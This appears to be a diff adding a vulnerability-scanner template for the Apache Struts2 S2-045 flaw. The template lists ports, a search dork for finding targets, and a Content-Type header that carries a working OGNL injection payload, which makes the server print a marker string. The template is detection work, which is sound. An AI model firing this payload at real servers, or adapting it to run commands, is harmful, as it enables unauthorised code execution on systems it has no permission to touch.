@@ -1,0 +1,18 @@
+{
+    "name": "RAP_Struts2_S2-045",
+    "method": "GET",
+    "port": [
+        80,
+        8080
+    ],
+    "dork": "body=org/index\\.do",
+    "suffix": [
+        ""
+    ],
+    "headers": {
+        "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('biu'+'framework')).(#o.close())}"
+    },
+    "hits": [
+        "biuframework"
+    ]
+}
